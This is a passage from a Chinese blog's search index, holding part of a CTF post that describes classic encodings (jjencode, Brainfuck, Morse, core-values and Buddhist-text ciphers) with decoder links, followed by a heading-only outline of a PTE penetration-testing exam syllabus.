alt="aaencode解码"></p><p>​    <strong>在线加解密：</strong></p><p><a href="http://www.atoolbox.net/Tool.php?Id=703">aaencode1</a></p><p><a href="https://www.qtool.net/decode">aaencode2</a></p><p><a href="https://utf-8.jp/public/aaencode.html">aaencode3</a></p><h3 id="jjencode编码"><a href="#jjencode编码" class="headerlink" title="jjencode编码"></a>jjencode编码</h3><p>​    <strong>特征：</strong></p><p>将JS代码转换成<strong>只有符号</strong>的字符串</p><p>​    <strong>举例：</strong></p><p><img src="/../img/1605779161126.png" alt="jjencode"></p><p>​    <strong>在线加解密：</strong></p><p><a href="http://www.atoolbox.net/Tool.php?Id=704">jjencode加密</a></p><p><a href="https://www.qtool.net/decode">jjencode解密</a></p><h3 id="brainfuck编码"><a href="#brainfuck编码" class="headerlink" title="brainfuck编码"></a>brainfuck编码</h3><p>​    <strong>简述：</strong></p><p>Brainfuck是一种极小化的计算机语言，按照”Turing complete（完整图灵机）”思想设计的语言，它的主要设计思路是：用最小的概念实现一种“简单”的语言。</p><p>​    <strong>特征：</strong></p><p>BrainFuck 语言只有八种符号，所有的操作都由这八种符号 <strong>(&gt; &lt; + - . , [ ])</strong> 的组合来完成。 </p><p>​    <strong>举例：</strong></p><pre><code>明文：hello,world.密文：+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++++ .---. +++++ ++..+ ++.&lt;+ +++++ ++[-&gt;----- ---&lt;] &gt;---. &lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ +++++ ++++. ----- ---.+++.-- ----. ----- ---.&lt; +++++ ++[-&gt; ----- --&lt;]&gt; ----- .&lt;</code></pre><p>​    <strong>在线加解密：</strong></p><p><a href="https://www.splitbrain.org/services/ook">Brainfuck1</a></p><p><a href="https://www.nayuki.io/page/brainfuck-interpreter-javascript">Brainfuck2</a></p><h3 id="莫尔斯电码"><a href="#莫尔斯电码" class="headerlink" title="莫尔斯电码"></a>莫尔斯电码</h3><p>​    <strong>简述：</strong></p><p>​    摩尔斯电码(Morse Code)是由美国人萨缪尔·摩尔斯在1836年发明的一种时通时断的且通过不同的排列顺序来表达不同英文字母、数字和标点符号的信号代码，摩尔斯电码主要由以下5种它的代码组成：</p><ol><li>点（.）</li><li>划（-）</li><li>每个字符间短的停顿（通常用空格表示停顿）</li><li>每个词之间中等的停顿（通常用 <code>/</code> 划分）</li><li>以及句子之间长的停顿</li></ol><p>莫尔斯电码对应表：</p><table><thead><tr><th>A   <strong>.-</strong></th><th>B   <strong>-…</strong></th><th>C   <strong>-.-.</strong></th><th>D   <strong>-..</strong></th><th>E   <strong>.</strong></th><th>F   <strong>..-.</strong></th><th>G   <strong>–.</strong></th><th>H   <strong>….</strong></th><th>I   <strong>..</strong></th><th>J   <strong>.—</strong></th></tr></thead><tbody><tr><td>K   <strong>-.-</strong></td><td>L   <strong>.-..</strong></td><td>M   <strong>–</strong></td><td>N   <strong>-.</strong></td><td>O   <strong>—</strong></td><td>P   <strong>.–.</strong></td><td>Q   <strong>–.-</strong></td><td>R   <strong>.-.</strong></td><td>S   <strong>…</strong></td><td>T   <strong>-</strong></td></tr><tr><td>U   <strong>..-</strong></td><td>V   <strong>…-</strong></td><td>W   <strong>.–</strong></td><td>X   <strong>-..-</strong></td><td>Y   <strong>-.–</strong></td><td>Z   <strong>–..</strong></td><td>0   <strong>—–</strong></td><td>1   <strong>.—-</strong></td><td>2   <strong>..—</strong></td><td>3   <strong>…–</strong></td></tr><tr><td>4   <strong>….-</strong></td><td>5   <strong>…..</strong></td><td>6   <strong>-….</strong></td><td>7   <strong>–…</strong></td><td>8   <strong>—..</strong></td><td>9   <strong>—-.</strong></td><td>.   <strong>.-.-.-</strong></td><td>,   <strong>–..–</strong></td><td>?   <strong>..–..</strong></td><td>-   <strong>-….-</strong></td></tr><tr><td>=   <strong>-…-</strong></td><td>:   <strong>—…</strong></td><td>;   <strong>-.-.-.</strong></td><td>(   <strong>-.–.</strong></td><td>)   <strong>-.–.-</strong></td><td>/   <strong>-..-.</strong></td><td>“   <strong>.-..-.</strong></td><td>$   <strong>…-..-</strong></td><td>‘   <strong>.—-.</strong></td><td>¶   <strong>.-.-..</strong></td></tr><tr><td>_   <strong>..–.-</strong></td><td>@   <strong>.–.-.</strong></td><td>!   <strong>—.</strong></td><td>!   <strong>-.-.–</strong></td><td>+   <strong>.-.-.</strong></td><td>~   <strong>.-…</strong></td><td>#   <strong>…-.-</strong></td><td>&amp;   <strong>. …</strong></td><td>⁄   <strong>-..-.</strong></td><td></td></tr></tbody></table><p>​    <strong>特征：</strong></p><p>由 **. - “空格” / **表示。</p><p>​    <strong>举例：</strong></p><p><img src="/../img/1605776280497.png" alt="莫尔斯电码"></p><p>​    <strong>在线加解密：</strong></p><p><a href="http://rumkin.com/tools/cipher/morse.php">莫斯电码1</a></p><p><a href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx">莫斯电码2</a></p><h3 id="社会主义编码"><a href="#社会主义编码" class="headerlink" title="社会主义编码"></a>社会主义编码</h3><p>​    <strong>特征：</strong></p><p>字符全部是社会主义核心价值观。</p><p>​    <strong>举例：</strong></p><p><img src="/../img/1605778636185.png" alt="社会主义编码"></p><p>​    <strong>在线加解密：</strong></p><p><a href="https://sym233.github.io/core-values-encoder/">社会主义编码</a></p><h3 id="与佛论禅"><a href="#与佛论禅" class="headerlink" title="与佛论禅"></a>与佛论禅</h3><p>​    <strong>特征：</strong></p><p>密文以”佛曰：如是我闻：”开头，密文一般是与关佛经的汉字 </p><p>​    <strong>举例：</strong></p><p><img src="/../img/1605779656659.png" alt="与佛论禅"></p><p>​    <strong>在线工具：</strong></p><p><a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx">与佛论禅</a></p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> ctf </tag>
            
            <tag> 编码 </tag>
            
            <tag> 密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PTE考试框架</title>
      <link href="posts/ea61.html"/>
      <url>posts/ea61.html</url>
      
        <content type="html"><![CDATA[<p>@<a href>TOC</a></p><h2 id="第1章-知识类：WEB安全基础"><a href="#第1章-知识类：WEB安全基础" class="headerlink" title="第1章  知识类：WEB安全基础"></a>第1章  知识类：WEB安全基础</h2><h3 id="1-1-知识体：HTTP协议"><a href="#1-1-知识体：HTTP协议" class="headerlink" title="1.1 知识体：HTTP协议"></a>1.1 知识体：HTTP协议</h3><h4 id="1-1-1-知识域：HTTP请求方法"><a href="#1-1-1-知识域：HTTP请求方法" class="headerlink" title="1.1.1 知识域：HTTP请求方法"></a><a href="https://www.baidu.com/">1.1.1 知识域：HTTP请求方法</a></h4><h4 id="1-1-2-知识域：HTTP状态码"><a href="#1-1-2-知识域：HTTP状态码" class="headerlink" title="1.1.2 知识域：HTTP状态码"></a>1.1.2 知识域：HTTP状态码</h4><h4 id="1-1-3-知识域：HTTP响应头信息"><a href="#1-1-3-知识域：HTTP响应头信息" class="headerlink" title="1.1.3 知识域：HTTP响应头信息"></a>1.1.3 知识域：HTTP响应头信息</h4><h4 id="1-1-4-知识域：HTTP协议中的URL"><a href="#1-1-4-知识域：HTTP协议中的URL" class="headerlink" title="1.1.4  知识域：HTTP协议中的URL"></a>1.1.4  知识域：HTTP协议中的URL</h4><h3 id="1-2-知识体：注入漏洞"><a href="#1-2-知识体：注入漏洞" class="headerlink" title="1.2 知识体：注入漏洞"></a>1.2 知识体：注入漏洞</h3><h4 id="1-2-1-知识域：SQL注入"><a href="#1-2-1-知识域：SQL注入" class="headerlink" title="1.2.1 知识域：SQL注入"></a>1.2.1 知识域：SQL注入</h4><h4 id="1-2-2-知识域：XML注入"><a href="#1-2-2-知识域：XML注入" class="headerlink" title="1.2.2 知识域：XML注入"></a>1.2.2 知识域：XML注入</h4><h4 id="1-2-3-知识域：代码注入"><a href="#1-2-3-知识域：代码注入" class="headerlink" title="1.2.3 知识域：代码注入"></a>1.2.3 知识域：代码注入</h4><h3 id="1-3-知识体：XSS漏洞"><a href="#1-3-知识体：XSS漏洞" class="headerlink" title="1.3 知识体：XSS漏洞"></a>1.3 知识体：XSS漏洞</h3><h4 id="1-3-1-知识域：存储式XSS漏洞"><a href="#1-3-1-知识域：存储式XSS漏洞" class="headerlink" title="1.3.1 知识域：存储式XSS漏洞"></a>1.3.1 知识域：存储式XSS漏洞</h4><h4 id="1-3-2-知识域：反射式XSS漏洞"><a href="#1-3-2-知识域：反射式XSS漏洞" class="headerlink" title="1.3.2 知识域：反射式XSS漏洞"></a>1.3.2 知识域：反射式XSS漏洞</h4><h4 id="1-3-3-知识域：DOM式XSS漏洞"><a href="#1-3-3-知识域：DOM式XSS漏洞" class="headerlink" title="1.3.3 知识域：DOM式XSS漏洞"></a>1.3.3 知识域：DOM式XSS漏洞</h4><h3 id="1-4-知识体：请求伪造漏洞"><a href="#1-4-知识体：请求伪造漏洞" class="headerlink" title="1.4 知识体：请求伪造漏洞"></a>1.4 知识体：请求伪造漏洞</h3><h4 id="1-4-2-知识域：SSRF漏洞"><a href="#1-4-2-知识域：SSRF漏洞" class="headerlink" title="1.4.2 知识域：SSRF漏洞"></a>1.4.2 知识域：SSRF漏洞</h4><h4 id="1-4-2-知识域：CSRF漏洞"><a href="#1-4-2-知识域：CSRF漏洞" class="headerlink" title="1.4.2 知识域：CSRF漏洞"></a>1.4.2 知识域：CSRF漏洞</h4><h3 id="1-5-知识体：文件处理漏洞"><a href="#1-5-知识体：文件处理漏洞" class="headerlink" title="1.5 知识体：文件处理漏洞"></a>1.5 知识体：文件处理漏洞</h3><h4 id="1-5-1-知识域：任意文件上传"><a href="#1-5-1-知识域：任意文件上传" class="headerlink" title="1.5.1 知识域：任意文件上传"></a>1.5.1 知识域：任意文件上传</h4><h4 id="1-5-2-知识域：任意文件下载"><a href="#1-5-2-知识域：任意文件下载" class="headerlink" title="1.5.2 知识域：任意文件下载"></a>1.5.2 知识域：任意文件下载</h4><h3 id="1-6-知识体：访问控制漏洞"><a href="#1-6-知识体：访问控制漏洞" class="headerlink" title="1.6 知识体：访问控制漏洞"></a>1.6 知识体：访问控制漏洞</h3><h4 id="1-6-1-知识域：横向越权"><a href="#1-6-1-知识域：横向越权" class="headerlink" title="1.6.1 知识域：横向越权"></a>1.6.1 知识域：横向越权</h4><h4 id="1-6-2-知识域：垂直越权"><a href="#1-6-2-知识域：垂直越权" class="headerlink" title="1.6.2 知识域：垂直越权"></a>1.6.2 知识域：垂直越权</h4><h3 id="1-7-知识体：会话管理漏洞"><a href="#1-7-知识体：会话管理漏洞" class="headerlink" title="1.7 知识体：会话管理漏洞"></a>1.7 知识体：会话管理漏洞</h3><h4 id="1-7-1-知识域：会话劫持"><a href="#1-7-1-知识域：会话劫持" class="headerlink" title="1.7.1 知识域：会话劫持"></a>1.7.1 知识域：会话劫持</h4><h4 id="1-7-2-知识域：会话固定"><a href="#1-7-2-知识域：会话固定" class="headerlink" title="1.7.2 知识域：会话固定"></a>1.7.2 知识域：会话固定</h4><h2 id="第2章-知识类：中间件安全基础"><a href="#第2章-知识类：中间件安全基础" class="headerlink" title="第2章 知识类：中间件安全基础"></a>第2章 知识类：中间件安全基础</h2><h3 id="2-1知识体：主流的中间件"><a href="#2-1知识体：主流的中间件" class="headerlink" title="2.1知识体：主流的中间件"></a>2.1知识体：主流的中间件</h3><h4 id="2-1-1-知识域：Apache"><a href="#2-1-1-知识域：Apache" class="headerlink" title="2.1.1 知识域：Apache"></a>2.1.1 知识域：Apache</h4><h4 id="2-1-2-知识域：IIS"><a href="#2-1-2-知识域：IIS" class="headerlink" title="2.1.2 知识域：IIS"></a>2.1.2 知识域：IIS</h4><h4 id="2-1-3-知识域：Tomcat"><a href="#2-1-3-知识域：Tomcat" class="headerlink" title="2.1.3 知识域：Tomcat"></a>2.1.3 知识域：Tomcat</h4><h3 id="2-2-知识体：JAVA开发的中间件"><a href="#2-2-知识体：JAVA开发的中间件" class="headerlink" title="2.2 知识体：JAVA开发的中间件"></a>2.2 知识体：JAVA开发的中间件</h3><h4 id="2-2-1-知识域：Weblogic"><a href="#2-2-1-知识域：Weblogic" class="headerlink" title="2.2.1 知识域：Weblogic"></a>2.2.1 知识域：Weblogic</h4><h4 id="2-2-2-知识域：Websphere"><a href="#2-2-2-知识域：Websphere" class="headerlink" title="2.2.2 知识域：Websphere"></a>2.2.2 知识域：Websphere</h4><h4 id="2-2-3-知识域：Jboss"><a href="#2-2-3-知识域：Jboss" class="headerlink" title="2.2.3 知识域：Jboss"></a>2.2.3 知识域：Jboss</h4><h2 id="第3章-知识类：操作系统安全基础"><a href="#第3章-知识类：操作系统安全基础" class="headerlink" title="第3章 知识类：操作系统安全基础"></a>第3章 知识类：操作系统安全基础</h2><h3 id="3-1-知识体：Windows操作系统"><a href="#3-1-知识体：Windows操作系统" class="headerlink" title="3.1 知识体：Windows操作系统"></a>3.1 知识体：Windows操作系统</h3><h4 id="3-1-1-知识域：账户安全"><a href="#3-1-1-知识域：账户安全" class="headerlink" title="3.1.1 知识域：账户安全"></a>3.1.1 知识域：账户安全</h4><h4 id="3-1-2-知识域：文件系统安全"><a href="#3-1-2-知识域：文件系统安全" class="headerlink" title="3.1.2 知识域：文件系统安全"></a>3.1.2 知识域：文件系统安全</h4><h4 id="3-1-3-知识域：日志分析"><a href="#3-1-3-知识域：日志分析" class="headerlink" title="3.1.3 知识域：日志分析"></a>3.1.3 知识域：日志分析</h4><h3 id="3-2-知识体：Linux操作系统"><a href="#3-2-知识体：Linux操作系统" class="headerlink" title="3.2 知识体：Linux操作系统"></a>3.2 知识体：Linux操作系统</h3><h4 id="3-2-1-知识域：账户安全"><a href="#3-2-1-知识域：账户安全" class="headerlink" title="3.2.1 知识域：账户安全"></a>3.2.1 知识域：账户安全</h4><h4 id="3-2-2-知识域：文件系统安全"><a href="#3-2-2-知识域：文件系统安全" class="headerlink" title="3.2.2 知识域：文件系统安全"></a>3.2.2 知识域：文件系统安全</h4><h4 id="3-2-3-知识域：日志分析"><a href="#3-2-3-知识域：日志分析" class="headerlink" title="3.2.3 知识域：日志分析"></a>3.2.3 知识域：日志分析</h4><h2 id="第4章-知识类：数据库安全基础"><a href="#第4章-知识类：数据库安全基础" class="headerlink" title="第4章 知识类：数据库安全基础"></a>第4章 知识类：数据库安全基础</h2><h3 id="4-1-知识体：关系型数据库"><a href="#4-1-知识体：关系型数据库" class="headerlink" title="4.1 知识体：关系型数据库"></a>4.1 知识体：关系型数据库</h3><h4 id="4-1-1-知识域：MsSQL数据库"><a href="#4-1-1-知识域：MsSQL数据库" class="headerlink" title="4.1.1 知识域：MsSQL数据库"></a>4.1.1 知识域：MsSQL数据库</h4><h4 id="4-1-2-知识域：MySQL数据库"><a href="#4-1-2-知识域：MySQL数据库" class="headerlink" title="4.1.2 知识域：MySQL数据库"></a>4.1.2 知识域：MySQL数据库</h4><h4 id="4-1-3-知识域：Oracle-数据库"><a href="#4-1-3-知识域：Oracle-数据库" class="headerlink" title="4.1.3 知识域：Oracle 数据库"></a>4.1.3 知识域：Oracle 数据库</h4><h3 id="4-2-知识体：非关系型数据库"><a href="#4-2-知识体：非关系型数据库" class="headerlink" title="4.2 知识体：非关系型数据库"></a>4.2 知识体：非关系型数据库</h3><h4 id="4-2-1-知识域：Redis数据库"><a href="#4-2-1-知识域：Redis数据库" class="headerlink" title="4.2.1 知识域：Redis数据库"></a>4.2.1 知识域：Redis数据库</h4>]]></content>
      
      
      <categories>
          
          <category> pte </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pte </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
